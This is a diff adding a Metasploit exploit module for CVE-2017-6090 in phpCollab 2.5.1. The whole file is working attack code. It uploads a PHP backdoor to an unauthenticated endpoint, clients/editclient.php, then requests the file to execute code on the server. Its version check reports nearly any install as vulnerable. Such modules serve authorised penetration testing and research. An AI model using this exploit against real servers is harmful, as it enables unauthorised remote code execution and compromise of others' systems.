@@ -1,0 +1,104 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'phpCollab 2.5.1 Unauthenticated File Upload',
+      'Description'    => %q{
+          This module exploits a file upload vulnerability in phpCollab 2.5.1
+        which could be abused to allow unauthenticated users to execute arbitrary code
+        under the context of the web server user.
+
+        The exploit has been tested on Ubuntu 16.04.3 64-bit
+      },
+      'Author'         =>
+        [
+          'Nicolas SERRA <n.serra[at]sysdream.com>', # Vulnerability discovery
+          'Nick Marcoccio "1oopho1e" <iremembermodems[at]gmail.com>', # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2017-6090' ],
+          [ 'EDB', '42934' ],
+          [ 'URL', 'http://www.phpcollab.com/' ],
+          [ 'URL', 'https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/' ]
+        ],
+      'Privileged'     => false,
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [ ['Automatic', {}] ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Sep 29 2017'
+      ))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [ true, "Installed path of phpCollab ", "/phpcollab/"])
+        ])
+  end
+
+  def check
+    url = normalize_uri(target_uri.path, "general/login.php?msg=logout")
+    res = send_request_cgi(
+        'method'  => 'GET',
+        'uri'     =>  url
+    )
+
+    version = res.body.scan(/PhpCollab v([\d\.]+)/).flatten.first
+    vprint_status("Found version: #{version}")
+
+    unless version
+      vprint_status('Unable to get the PhpCollab version.')
+      return CheckCode::Unknown
+    end
+
+    if Gem::Version.new(version) >= Gem::Version.new('0')
+      return CheckCode::Appears
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    filename = '1.' + rand_text_alpha(8 + rand(4)) + '.php'
+    id = File.basename(filename,File.extname(filename))
+    register_file_for_cleanup(filename)
+
+    data = Rex::MIME::Message.new
+    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"upload\"; filename=\"#{filename}\"")
+
+    print_status("Uploading backdoor file: #{filename}")
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'clients/editclient.php'),
+      'vars_get' => {
+        'id'     => id,
+        'action' => 'update'
+      },
+      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
+      'data'     => data.to_s
+     })
+
+    if res && res.code == 302
+      print_good("Backdoor successfully created.")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Error on uploading file")
+    end
+
+    print_status("Triggering the exploit...")
+    send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri(target_uri.path, "logos_clients/" + filename)
+     }, 5)
+  end
+end
